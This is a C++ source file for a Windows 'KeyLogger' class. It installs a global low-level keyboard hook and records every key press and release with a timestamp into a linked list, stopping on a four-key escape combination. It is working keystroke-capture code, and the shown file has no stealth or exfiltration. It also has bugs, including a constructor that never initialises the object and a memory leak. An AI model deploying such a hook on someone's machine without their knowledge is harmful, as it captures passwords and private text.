#include "stdafx.h"
#include "KeyLogger.h"
static KeyLogger* selfRef = nullptr;
KeyLogger::KeyLogger()
{
	ctrlDown = false;
	escapeSequence = false;
	head = new Logger::LogNode("", 0);
	curr = new Logger::LogNode("", 0);
	selfRef = this;
}

KeyLogger::KeyLogger(HANDLE h) {
	logHandle = h;
	KeyLogger();
}

KeyLogger::~KeyLogger()
{
	//delete(logHook);
}

LRESULT CALLBACK KeyLogger::hookProcess(int code, WPARAM wParam, LPARAM lParam) {
	KBDLLHOOKSTRUCT* pKeyboardStruct = (KBDLLHOOKSTRUCT *)lParam;
	std::string * keyLogLine = new std::string();
	selfRef->strStream.str("");
	if (pKeyboardStruct != NULL) {
		UINT VK = MapVirtualKey(pKeyboardStruct->scanCode, MAPVK_VSC_TO_VK);
		char key = MapVirtualKey(VK, MAPVK_VK_TO_CHAR);
		if (wParam == WM_KEYDOWN) {
			for (int i = 0;i < 4;i++) {
				if (selfRef->macroKeys[i] == VK) {
					selfRef->keysDown[i] = true;break;
				}
			}
			selfRef->escapeSequence = selfRef->keysDown[0] && selfRef->keysDown[1] && selfRef->keysDown[2] && selfRef->keysDown[3];
			if (selfRef->escapeSequence) { UnhookWindowsHookEx(selfRef->logHook); ExitThread(selfRef->logThread); }//Shift + Ctrl
			selfRef->strStream << "KD" << VK;

		}
		if (wParam == WM_KEYUP) {
			for (int i = 0;i < 4;i++) {
				if (selfRef->macroKeys[i] == VK) {
					selfRef->keysDown[i] = false;break;
				}
			}
			selfRef->strStream << "KU" << VK;
		}
		//Not sure why im doing this to get the time, but theres gotta be a reason that i did it this way. probably precision?
		double time = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count();
		selfRef->strStream << "T" <<std::fixed << time;
		LogNode* newNode = new LogNode(selfRef->strStream.str(), time);
		if (selfRef->head->next == NULL) {
			selfRef->head->next = newNode;
		}
		else {
			selfRef->curr->next = newNode;
		}
		selfRef->curr = newNode;
	}
	return CallNextHookEx((selfRef->logHook), code, wParam, lParam);
}

DWORD WINAPI KeyLogger::log(LPVOID param) {
	HINSTANCE hInstance = GetModuleHandle(NULL);
	logHook = SetWindowsHookEx(WH_KEYBOARD_LL, hookProcess, hInstance, NULL);
	MSG message;

	while (GetMessage(&message, NULL, 0, 0) && !escapeSequence) {
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
	UnhookWindowsHookEx(logHook);
	return 0;
}

